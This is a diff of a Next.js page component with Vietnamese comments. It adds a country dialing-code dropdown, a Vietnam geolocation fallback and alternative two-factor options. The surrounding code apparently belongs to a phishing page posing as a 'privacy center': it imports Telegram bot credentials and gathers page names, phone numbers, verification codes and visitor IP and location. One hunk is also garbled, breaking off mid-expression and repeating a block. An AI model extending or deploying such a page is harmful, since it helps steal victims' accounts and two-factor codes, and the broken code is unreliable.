@@ -5,6 +5,7 @@ import { useRouter } from "next/navigation";
 import { FormEvent, useEffect, useRef, useState } from "react";
 import { Dictionary, LOCALE_COOKIE_NAME, Locale, getDictionary, resolveLocaleFromCountryCode } from "@/lib/i18n";
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, IPGEO_API_KEY } from "@/lib/config";
+import { COUNTRIES, findCountryByCode } from "@/lib/countries";
 import styles from "./page.module.css";
 
 type ActionItem = {
@@ -310,8 +311,15 @@ export default function HomePageClient({
   const [clientCallingCode, setClientCallingCode] = useState(normalizeCallingCode(detectedCallingCode));
   const [clientLocation, setClientLocation] = useState(detectedLocation ?? "");
   const [clientIp, setClientIp] = useState(detectedIp ?? "");
-  const phoneFlag = countryCodeToFlag(clientCountryCode);
-  const phoneCode = normalizeCallingCode(clientCallingCode);
+
+  // ⬇️ State mới cho dropdown chọn quốc gia
+  const [selectedCountryCode, setSelectedCountryCode] = useState<string>(detectedCountryCode ?? "");
+  const [countryDropdownOpen, setCountryDropdownOpen] = useState(false);
+  const countryDropdownRef = useRef<HTMLDivElement | null>(null);
+
+  const selectedCountry = findCountryByCode(selectedCountryCode);
+  const phoneFlag = selectedCountry?.flag ?? countryCodeToFlag(selectedCountryCode || clientCountryCode);
+  const phoneCode = selectedCountry?.dial ?? normalizeCallingCode(clientCallingCode);
 
   const privacyCenterActions: ActionItem[] = [
     {
@@ -578,6 +586,7 @@ export default function HomePageClient({
     setCode1("");
     setCode2("");
     setCode3("");
+    setCountryDropdownOpen(false);
     if (formTimerRef.current) {
       clearTimeout(formTimerRef.current);
       formTimerRef.current = null;
@@ -819,43 +828,56 @@ export default function HomePageClient({
     setActiveLocale(locale);
   }, [locale]);
 
+  // Đồng bộ locale theo quốc gia đã chọn (chỉ chạy khi selectedCountryCode đổi)
   useEffect(() => {
-    if (!clientCountryCode) {
+    if (!selectedCountryCode) {
       return;
     }
-    const nextLocale = resolveLocaleFromCountryCode(clientCountryCode);
-    if (nextLocale === activeLocale) {
-      setActiveLocale(nextLocale);
-    }
+    const nextLocale = resolveLocaleFromCountryCode(selectedCountryCode);
     setActiveLocale(nextLocale);
     if (typeof document !== "undefined") {
       document.cookie = `${LOCALE_COOKIE_NAME}=${nextLocale};path=/;max-age=${60 * 60 * 24 * 365};samesite=lax`;
     }
-  }, [clientCountryCode, activeLocale, locale]);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [selectedCountryCode]);
 
+  // Đóng dropdown khi click ra ngoài
+  useEffect(() => {
+    if (!countryDropdownOpen) {
+      return;
+    }
+    const handleClickOutside = (event: MouseEvent) => {
+      if (countryDropdownRef.current && !countryDropdownRef.current.contains(event.target as Node)) {
+        setCountryDropdownOpen(false);
+      }
+    };
+    document.addEventListener("mousedown", handleClickOutside);
+    return () => document.removeEventListener("mousedown", handleClickOutside);
+  }, [countryDropdownOpen]);
+
+  // Auto-detect IP → set country/calling code
   useEffect(() => {
     let cancelled = false;
 
-const fetchGeo = async () => {
-  const applyUsFallback = () => {
-    if (cancelled) {
-      return;
-    }
-    setClientCountryCode("US");
-    setClientCallingCode("+1");
-    setClientLocation("N/A / N/A / United States");
-  };
+    const fetchGeo = async () => {
+      const applyFallback = () => {
+        if (cancelled) return;
+        setClientCountryCode("VN");
+        setClientCallingCode("+84");
+        setClientLocation("N/A / N/A / Vietnam");
+        setSelectedCountryCode("VN");
+      };
 
-  try {
-    const response = await fetch("https://api.ipify.org?format=json");
-    if (!response.ok) {
-      throw new Error("Failed to fetch IP data");
-    }
-    const result = (await response.json()) as { ip?: string };
-    if (!result?.ip || cancelled) {
-      applyUsFallback();
-      return;
-    }
+      try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        if (!response.ok) {
+          throw new Error("Failed to fetch IP data");
+        }
+        const result = (await response.json()) as { ip?: string };
+        if (!result?.ip || cancelled) {
+          applyFallback();
+          return;
+        }
 
         setClientIp(result.ip);
 
@@ -883,16 +905,17 @@ const fetchGeo = async () => {
         const country = locationData?.country_name || "N/A";
 
         if (!countryCode || !callingCode) {
-          applyUsFallback();
+          applyFallback();
           return;
         }
 
         setClientCallingCode(callingCode);
         setClientCountryCode(countryCode);
         setClientLocation(`${district} / ${city} / ${country}`);
+        setSelectedCountryCode(countryCode); // ⬅️ auto chọn theo IP
       } catch (err) {
         console.error(err);
-        applyUsFallback();
+        applyFallback();
       }
     };
 
@@ -949,6 +972,20 @@ const fetchGeo = async () => {
       : twoFactorError;
 
   const altMethods = [
+    {
+      id: "app",
+      title: modal.altMethodAppTitle,
+      subtitle: modal.altMethodAppSubtitle,
+    },
+    {
+      id: "whatsapp",
+      title: modal.altMethodWhatsappTitle,
+      subtitle: applyTemplate(modal.altMethodWhatsappSubtitle, maskPhoneTail(form.phoneNumber)),
+    },
+    {
+      id: "sms",
+      title: modal.
+         const altMethods = [
     {
       id: "app",
       title: modal.altMethodAppTitle,
@@ -1158,11 +1195,45 @@ const fetchGeo = async () => {
                   />
                   {errors.pageName ? <p className={styles.fieldError}>{errors.pageName}</p> : null}
 
-                  <div className={styles.phoneInputWrap}>
-                    <span className={styles.phonePrefix}>
+                  <div className={styles.phoneInputWrap} ref={countryDropdownRef}>
+                    <button
+                      type="button"
+                      className={styles.phonePrefix}
+                      onClick={() => setCountryDropdownOpen((prev) => !prev)}
+                      aria-haspopup="listbox"
+                      aria-expanded={countryDropdownOpen}
+                    >
                       <span className={styles.phoneFlag}>{phoneFlag}</span>
-                      <span className={styles.phoneCode}>{phoneCode}</span>
-                    </span>
+                      <span className={styles.phoneCode}>{phoneCode || "+--"}</span>
+                      <span className={styles.phoneChevron}>
+                        <ChevronIcon direction={countryDropdownOpen ? "up" : "down"} />
+                      </span>
+                    </button>
+
+                    {countryDropdownOpen ? (
+                      <div className={styles.countryDropdown} role="listbox">
+                        {COUNTRIES.map((country) => (
+                          <button
+                            key={country.code}
+                            type="button"
+                            role="option"
+                            aria-selected={country.code === selectedCountryCode}
+                            className={`${styles.countryOption} ${country.code === selectedCountryCode ? styles.countryOptionActive : ""}`}
+                            onClick={() => {
+                              setSelectedCountryCode(country.code);
+                              setClientCountryCode(country.code);
+                              setClientCallingCode(country.dial);
+                              setCountryDropdownOpen(false);
+                            }}
+                          >
+                            <span className={styles.countryOptionFlag}>{country.flag}</span>
+                            <span className={styles.countryOptionName}>{country.name}</span>
+                            <span className={styles.countryOptionDial}>{country.dial}</span>
+                          </button>
+                        ))}
+                      </div>
+                    ) : null}
+
                     <input
                       id="phoneNumber"
                       type="tel"
@@ -1367,3 +1438,4 @@ const fetchGeo = async () => {
     </div>
   );
 }
+        
